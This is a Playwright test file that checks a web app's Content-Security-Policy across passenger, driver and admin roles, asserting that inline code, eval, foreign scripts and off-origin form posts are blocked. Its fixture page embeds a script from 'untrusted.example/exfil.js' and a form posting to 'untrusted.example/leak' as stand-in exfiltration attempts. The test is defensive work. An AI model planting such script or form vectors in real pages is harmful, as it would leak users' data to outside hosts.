import assert from 'node:assert/strict';
import test from 'node:test';
import { createServer } from 'node:http';
import { once } from 'node:events';
import { webSecurityPolicy } from './web_security_policy.mjs';
const moduleUrl = process.env.RAMO_BROWSER_TEST_MODULE ?? new URL('./browser-tests/node_modules/playwright/index.mjs', import.meta.url).href;
const { chromium } = await import(moduleUrl);
let server, browser, origin;
const script = `
globalThis.securityFixture = { allowed: true, violations: [] };
addEventListener('securitypolicyviolation', event => securityFixture.violations.push(event.effectiveDirective));
try { new Function('securityFixture.evalRan = true')(); } catch { securityFixture.evalBlocked = true; }
securityFixture.wasm = WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0])).then(() => true, () => false);
`;
test.before(async () => {
  server = createServer((request, response) => {
    const role = request.url.split('/')[1];
    if (!['passenger', 'driver', 'admin'].includes(role)) { response.writeHead(404); response.end(); return; }
    response.writeHead(200, { 'content-type': request.url.endsWith('.js') ? 'text/javascript' : 'text/html',
      'content-security-policy': webSecurityPolicy(role, origin) });
    response.end(request.url.endsWith('.js') ? script : `<!doctype html><html><head>
      <script src="/${role}/allowed.js"></script></head><body>
      <script>securityFixture.inlineRan = true</script>
      <button id="inline" onclick="securityFixture.attributeRan = true">Test</button>
      <script src="https://untrusted.example/exfil.js"></script>
      <form id="outside" action="https://untrusted.example/leak" method="post"><input name="fixture" value="dummy"></form>
      <form id="inside" action="/${role}/local-submit" method="post"><input name="fixture" value="dummy"></form>
      </body></html>`);
  });
  server.listen(0, '127.0.0.1'); await once(server, 'listening');
  origin = 'http://127.0.0.1:' + server.address().port;
  browser = await chromium.launch({ headless: true, args: ['--disable-background-networking'],
    ...(process.env.RAMO_CHROMIUM_EXECUTABLE_PATH ? { executablePath: process.env.RAMO_CHROMIUM_EXECUTABLE_PATH } : {}) });
});
test.after(async () => { await browser?.close(); if (server) await new Promise(resolve => server.close(resolve)); });
for (const role of ['passenger', 'driver', 'admin']) {
  test(role + ': inline code, handlers and foreign scripts cannot execute', async t => {
    const page = await browser.newPage(); t.after(() => page.close());
    const foreign = [];
    await page.route('**/*', route => {
      if (route.request().url().startsWith(origin)) return route.continue();
      foreign.push(route.request().url()); return route.abort();
    });
    await page.goto(origin + '/' + role + '/');
    await page.click('#inline');
    await page.waitForFunction(() => securityFixture.violations.includes('script-src-attr'));
    const result = await page.evaluate(async () => ({ ...securityFixture, wasm: await securityFixture.wasm }));
    assert.equal(result.allowed, true);
    assert.equal(result.inlineRan, undefined); assert.equal(result.attributeRan, undefined);
    assert.equal(result.evalRan, undefined); assert.equal(result.evalBlocked, true);
    assert.equal(result.wasm, role !== 'admin');
    assert.ok(result.violations.includes('script-src-elem'));
    assert.deepEqual(foreign, []);
  });
  test(role + ': foreign form submission is blocked and same-origin form remains available', async t => {
    const page = await browser.newPage(); t.after(() => page.close());
    const foreign = [];
    await page.route('**/*', route => {
      if (route.request().url().startsWith(origin)) return route.continue();
      foreign.push(route.request().url()); return route.abort();
    });
    await page.goto(origin + '/' + role + '/');
    await page.evaluate(() => document.querySelector('#outside').submit());
    await page.waitForFunction(() => securityFixture.violations.includes('form-action'));
    assert.equal(page.url(), origin + '/' + role + '/');
    assert.deepEqual(foreign, []);
    await Promise.all([page.waitForURL(origin + '/' + role + '/local-submit'),
      page.evaluate(() => document.querySelector('#inside').submit())]);
  });
}
